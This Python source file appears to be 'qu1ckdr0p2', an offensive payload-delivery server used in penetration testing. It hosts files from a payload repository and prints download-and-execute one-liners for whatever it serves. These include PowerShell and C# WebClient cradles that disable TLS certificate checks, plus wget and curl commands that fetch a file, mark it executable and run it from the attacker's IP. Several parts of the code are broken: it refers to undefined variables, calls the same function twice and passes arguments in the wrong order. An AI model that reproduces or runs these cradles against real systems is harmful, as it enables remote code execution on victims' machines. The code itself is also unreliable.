from flask import Flask, send_from_directory
from flask.logging import request
from tqdm import tqdm
from halo import Halo
from OpenSSL import crypto
import os
import netifaces as ni
import logging
import click
import configparser
import subprocess
import signal
import sys


cli = sys.modules['flask.cli']
cli.show_server_banner = lambda *x: None
app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
logging.basicConfig(level=logging.INFO)

user_home = os.path.expanduser("~")
base_dir = os.path.join(user_home, ".qu1ckdr0p2")
directory = os.path.dirname(os.path.abspath(__file__))

target_directories = ["config", "windows", "linux", "mac", "windows/powershell", "windows/powershell/PowerSharpPack/PowerSharpBinaries", "windows/powershell/PowerSharpPack"]
other_directories = ["payloads", "certs"]

payloads = os.path.join(user_home, ".qu1ckdr0p2", 'payloads')
cert_dir = os.path.join(user_home, ".qu1ckdr0p2", 'certs')

cert_path = os.path.join(cert_dir, 'cert.pem')
key_path = os.path.join(cert_dir, 'key.pem')
cert = "cert.pem"
privkey = "key.pem"

config = configparser.ConfigParser()
common_ini_path = os.path.join(base_dir, 'config/common.ini')
config.read(common_ini_path)
aliases = {}
for section in config.sections():
    for key, value in config.items(section):
        aliases[key.lower()] = os.path.join(base_dir, value)

def signal_handler(signum, frame):
    click.echo(click.style(f"\n[*] ", fg='green') + click.style("CTRL+C detected, quitting\n", fg='yellow'))
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
                
def get_interface_ip(interface):
    try:
        ip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
        return ip
    except Exception as e:
        return None

def get_serving_ip():
    interfaces = ['tun0', 'eth0']
    for interface in interfaces:
        try:
            ip = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
            return ip, interface
        except Exception as e:
            continue
    return '0.0.0.0', 'None'

def generate_self_signed_cert(cert_dir):
    if not os.path.exists(cert_dir):
        os.makedirs(cert_dir)

    cert_path = os.path.join(cert_dir, 'cert.pem')
    key_path = os.path.join(cert_dir, 'key.pem')
    
    if not os.path.exists(cert_path) or not os.path.exists(key_path):
        key = crypto.PKey()
        key.generate_key(crypto.TYPE_RSA, 2048)
        
        cert = crypto.X509()
        cert.get_subject().C = "US"
        cert.get_subject().ST = "CA"
        cert.get_subject().L = "San Francisco"
        cert.get_subject().O = "qu1ckdr0p2"
        cert.get_subject().OU = "qu1ckdr0p2"
        cert.get_subject().CN = "localhost"
        cert.set_serial_number(1000)
        cert.gmtime_adj_notBefore(0)
        cert.gmtime_adj_notAfter(315360000)
        cert.set_issuer(cert.get_subject())
        cert.set_pubkey(key)
        cert.sign(key, 'sha256')
        
        with open(cert_path, 'wb') as cert_file:
            cert_file.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
        
        with open(key_path, 'wb') as key_file:
            key_file.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, key))
    
    return cert_path, key_path

def list_aliases(search, use, port):
    if use:
        invoke_serve_by_number(search, use, port=port)
    else:
        display_aliases(search)

def display_aliases(search=None):
    counter = 1
    for alias, path in aliases.items():
        if search:
            search_lower = search.lower()
            if not (search_lower in alias.lower() or search_lower in path.lower()):
                continue

        display_path = path.replace(os.path.expanduser("~"), "~")        
        click.echo(click.style(f"\n[→] ", fg='green') + click.style("Path: ", fg='yellow') + click.style(f"{display_path}", fg='blue'))
        click.echo(click.style(f"[→] ", fg='green') + click.style(f"Alias: ", fg='yellow') + click.style(f"{alias}", fg='blue'))
        click.echo(click.style(f"[→] ", fg='green') + click.style("Use: ", fg='yellow') + click.style(f"{counter}", fg='blue'))
        counter += 1

def load_config(file_path):
    config = configparser.ConfigParser()
    config.read(file_path)
    aliases = {}
    for section in config.sections():
        for key, value in config.items(section):
            aliases[key.lower()] = os.path.join(base_dir, value)
    return aliases


def generate_code_outputs(protocol, ip_address, port, filename):
    code_outputs = []

    if filename:
        if protocol == 'https':
            csharp_ignore_tls = (
                f"Add-Type -TypeDefinition \"using System.Net;using System.Security.Cryptography.X509Certificates;"
                f"public class SSLValidator {{public static void Ignore() {{ServicePointManager.ServerCertificateValidationCallback += "
                f"(sender, certificate, chain, sslPolicyErrors) => true;}}}}\" -Language CSharp; [SSLValidator]::Ignore();"
                f" $webclient = New-Object System.Net.WebClient; $webclient.DownloadFile('{protocol}://{ip_address}:{port}/{filename}', 'c:\\windows\\temp\\{filename}');Start-Process 'c:\\windows\\temp\\{filename}'"
            )

            wget_ignore_tls = f"wget --no-check-certificate {protocol}://{ip_address}:{port}/{filename} -O /tmp/{filename} && chmod +x /tmp/{filename} && /tmp/{filename}"

            curl_ignore_tls = f"curl -k {protocol}://{ip_address}:{port}/{filename} -o /tmp/{filename} && chmod +x /tmp/{filename} && /tmp/{filename}"

            powershell_ignore_tls = ( 
                            f"$AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols; $WebClient = New-Object System.Net.WebClient; $WebClient.DownloadFile('{protocol}://{ip_address}:{port}/{filename}', 'c:\\windows\\temp\\{filename}'); Start-Process 'c:\\windows\\temp\\{filename}'"
            )

            code_outputs.extend([
                ("csharp_ignore_tls", csharp_ignore_tls),
                ("wget_ignore_tls", wget_ignore_tls),
                ("curl_ignore_tls", curl_ignore_tls),
                ("powershell_ignore_tls", powershell_ignore_tls),
            ])

        else:
            csharp = (
                f"$webclient = New-Object System.Net.WebClient; $webclient.DownloadFile('{protocol}://{ip_address}:{port}/{filename}', 'c:\\windows\\temp\\{filename}'); Start-Process 'c:\\windows\\temp\\{filename}'"
            )

            wget = f"wget {protocol}://{ip_address}:{port}/{filename} -O /tmp/{filename} && chmod +x /tmp/{filename} && /tmp/{filename}"

            curl = f"curl {protocol}://{ip_address}:{port}/{filename} -o /tmp/{filename} && chmod +x /tmp/{filename} && /tmp/{filename}"

            powershell = f"Invoke-WebRequest -Uri {protocol}://{ip_address}:{port}/{filename} -OutFile c:\\windows\\temp\\{filename}; Start-Process c:\\windows\\temp\\{filename}"

            code_outputs.extend([
                ("csharp", csharp),
                ("wget", wget),
                ("curl", curl),
                ("powershell", powershell),
            ])
        

    return code_outputs

def print_server_info(path_to_serve, protocol, ip_address, interface_name, port, filename, cert=None, privkey=None):
    click.clear()
    base_dir = os.getcwd()  
    relative_path = os.path.relpath(path_to_serve, start=base_dir)
    
    click.echo(click.style(f"[→] ", fg='green') + click.style("Serving:", fg='yellow') + click.style(f" {relative_path}", fg='blue'))
    click.echo(click.style(f"[→] ", fg='green') + click.style("Protocol:", fg='yellow') + click.style(f" {protocol}", fg='blue'))
    click.echo(click.style(f"[→] ", fg='green') + click.style("IP address:", fg='yellow') + click.style(f" {ip_address}", fg='blue'))
    click.echo(click.style(f"[→] ", fg='green') + click.style("Port:", fg='yellow') + click.style(f" {port}", fg='blue'))
    click.echo(click.style(f"[→] ", fg='green') + click.style("Interface:", fg='yellow') + click.style(f" {interface_name}", fg='blue'))

    if cert and privkey:
        click.echo(click.style(f"[→] ", fg='green') + click.style("Using cert:", fg='yellow') + click.style(f" {cert}", fg='blue'))
        click.echo(click.style(f"[→] ", fg='green') + click.style("Using key:", fg='yellow') + click.style(f" {privkey}", fg='blue'))

    click.echo(click.style(f"[→] ", fg='green') + click.style("CTRL+C to quit", fg='yellow'))
    click.echo(click.style(f"\n[→] ", fg='green') + click.style("URL:", fg='yellow') + click.style(f" {protocol}://{ip_address}:{port}/{filename}\n", fg='blue'))

    code_outputs = generate_code_outputs(protocol, ip_address, port, filename)
    for code_type, code_output in code_outputs:
        click.echo(click.style(f"[↓] ", fg='green') + click.style(f"{code_type}:\n", fg='yellow') + click.style(f"{code_output}\n", fg='blue'))

    spinner = Halo(spinner='dots', color='cyan', text_color='yellow')
    spinner.start("Web server running")


          
def serve_files(path_to_serve, http_port=80, https_port=443):
    path_to_serve = os.path.abspath(path_to_serve)
    print(path_to_serve)
    if os.path.isdir(path_to_serve):
        @app.route('/')
        def index():
            files = os.listdir(path_to_serve)
            file_links = [f'<a href="/{file}">{file}</a><br>' for file in files]
            return '\n'.join(file_links)
        
        @app.route('/<path:filename>')
        def serve_file(filename):
            return send_from_directory(path_to_serve, filename)
        
        filename = os.path.basename(path_to_serve)
    else:
        directory, filename = os.path.split(path_to_serve)   
                
        @app.route('/')
        def index():
            return f'<a href="/{filename}">-> {filename}</a>'
        
        @app.route(f'/{filename}')
        def serve_file():
            return send_from_directory(directory, filename)

    protocol = "http" if http_port else "https"
    ip_address, interface_name = get_serving_ip()
    port = http_port or https_port

    
    cert_path, key_path = None, None
    if https_port:
        cert_path, key_path = generate_self_signed_cert(cert_dir)
        
    print_server_info(path_to_serve, protocol, ip_address, interface_name, port, filename, cert_path, key_path)

    @app.before_request
    def log_request_info():
        client_ip = request.remote_addr
        client_method = request.method
        client_path = request.url
        click.echo(click.style(f"\n[→] ", fg='green') + click.style("Client Connected: ", fg='yellow') + click.style(f"{client_ip}", fg='blue'))
        click.echo(click.style(f"[→] ", fg='green') + click.style("Method: ", fg='yellow') + click.style(f"{client_method}", fg='blue'))
        click.echo(click.style(f"[→] ", fg='green') + click.style("Path: ", fg='yellow') + click.style(f"{client_path}", fg='blue'))

    @app.after_request
    def log_response(response):
        if response.status_code == 200:
            click.echo(click.style(f"[→] ", fg='green') + click.style("Success: ", fg='yellow') + click.style(f"HTTP {response.status_code}", fg='blue'))
        else:
            click.echo(click.style(f"[*] ", fg='red') + click.style("Failed: ", fg='yellow') + click.style(f"HTTP {response.status_code}", fg='red'))
            click.echo(click.style(f"[*] ", fg='red') + click.style("Failure Message: ", fg='yellow') + click.style(f"{response.status}\n", fg='red'))
        return response

    if http_port:
        app.run(host='0.0.0.0', port=http_port, threaded=True)
    elif https_port:
        cert_path, key_path = generate_self_signed_cert(cert_dir)
        if cert_path and key_path:
            app.run(host='0.0.0.0', port=https_port, ssl_context=(cert_path, key_path), threaded=True)
        else:
            click.echo(click.style(f"\n[*] ", fg='red') + click.style("Could not generate or find SSL certificates.\n", fg='yellow'))

    
def invoke_serve_by_number(search=None, use=None, http=None, https=None):
    search_results = {alias: path for alias, path in aliases.items() if search.lower() in alias.lower() or search.lower() in path.lower()}
    if use > len(search_results) or use < 1:
        click.echo(click.style(f"\n[*] ", fg='red') + click.style("The number provided with --use is out of range.\n", fg='yellow'))
        return
    
    selected_alias = list(search_results.keys())[use - 1]
    selected_path = search_results[selected_alias]
    
    if not http and not https:
        https = 443
    
    serve_files(selected_path, http, https)
    
    selected_alias = list(search_results.keys())[use - 1]
    selected_path = search_results[selected_alias]
    serve_files(selected_path, http, https)

def list_local_files(directory_path):
    return set(os.listdir(directory_path))

def update_self_function():
    try:
        subprocess.run(['pip', 'install', '--upgrade', 'qu1ckdr0p2'], check=True)
        click.echo(click.style(f"[→] ", fg='green') + click.style("Successfully updated qu1ckdr0p2\n\n", fg='blue'))
    except subprocess.CalledProcessError as e:
        click.echo(click.style(f"[*] ", fg='red') + click.style("Failed to update {e}\n\n", fg='red'))
                 
    
@click.group()
@click.option('--debug', is_flag=True, help='Enable debug mode.')
@click.pass_context
def cli(ctx, debug):
    """Welcome to qu1ckdr0p2 entry point."""
    ctx.ensure_object(dict)
    ctx.obj['DEBUG'] = debug
    
    if debug:
        log.setLevel(logging.DEBUG)
        app.debug = True
        logging.basicConfig(level=logging.DEBUG)
        click.echo(click.style('[*] ', fg='red') + click.style('Debug mode enabled', fg='red', blink=True, bold=True))
          
@cli.command(context_settings={"help_option_names": ['-h', '--help']})
@click.option('-l', '--list', 'list_flag', is_flag=True, help="List aliases")
@click.option('-s', '--search', type=str, required=False, help="Search query for aliases")
@click.option('-u', '--use', type=int, required=False, help="Use an alias by a dynamic number")
# @click.option('-d', '--directory', type=click.Path(exists=True, file_okay=False), help="Serve a directory")
@click.option('-f', '--file', type=click.Path(exists=True, dir_okay=False), help="Serve a file")
@click.option('--http', type=int, default=None, help="Use HTTP with a custom port")
@click.option('--https', type=int, default=None, help="Use HTTPS with a custom port")
@click.pass_context
def serve(ctx, list_flag, search, use, file, http, https):
    """Serve files."""          
    if not any([list_flag, search, use, file, http, https]):
        click.echo(ctx.get_help())
        return
        
    if list_flag:
        list_aliases(None, None, None)
        return

    if search:
        if use is not None:
            invoke_serve_by_number(search, use, http, https)
        else:
            list_aliases(search, None, None)
        return

    if use is not None:
        click.echo(click.style(f"\n[*] ", fg='red') + click.style("You must provide a search term along with --use.\n", fg='yellow'))
        return

    if directory:
        if not http and not https:
            https = 443  
        serve_files(directory, http, https)
        return

    if file:
        file = os.path.abspath(file)  # Convert to absolute path
        if not http and not https:
            https = 443  
        serve_files(file, http, https)
        return 

@cli.command()
@click.option('--update', is_flag=True, help='Check and download missing tools.')
@click.option('--update-self', is_flag=True, help='Update the tool using pip.')
@click.option('--update-self-test', is_flag=True, help='Used for dev testing, installs unstable build.')
def init(update, update_self, update_self_test):
    """Perform updates."""
    if update:
        check_and_update_tools()
    if self_update:
        update_pip3()


def check_and_update_tools():
    if not os.path.exists(base_dir):
        click.echo(click.style(f"\n[*] ", fg='green') + click.style("Cloning qu1ckdr0p2-tools from GitHub.\n", fg='yellow'))
        try:
            subprocess.run(["git", "clone", "https://github.com/byinarie/qu1ckdr0p2-tools.git", base_dir], check=True)
        except subprocess.CalledProcessError as e:
            click.echo(click.style(f"\n[*] ", fg='red') + click.style("Failed to clone qu1ckdr0p2-tools from GitHub.\n", fg='yellow'))
    else:
        print(f"Directory {base_dir} exists. Pulling latest changes.")
        click.echo(click.style(f"\n[*] ", fg='green') + click.style("Pulling latest changes from GitHub.\n", fg='yellow'))
        try:
            subprocess.run(["git", "-C", base_dir, "pull"], check=True)
        except subprocess.CalledProcessError as e:
            print(f"Error occurred: {e}")   
            click.echo(click.style(f"\n[*] ", fg='red') + click.style("Failed to pull latest changes from GitHub.\n", fg='yellow'))

def update_pip3():
    """Update the tool using pip."""
    try:
        subprocess.run(['pip3', 'install', '--upgrade', 'qu1ckdr0p2'], check=True)
        click.echo(click.style(f"[→] ", fg='green') + click.style("Successfully updated qu1ckdr0p2\n\n", fg='blue'))
    except subprocess.CalledProcessError as e:
        click.echo(click.style(f"[*] ", fg='red') + click.style("Failed to update {e}\n\n", fg='red'))
                            
if __name__ == "__main__":
    target_directory = os.path.dirname(os.path.abspath(__file__))   
    cli(obj={})
    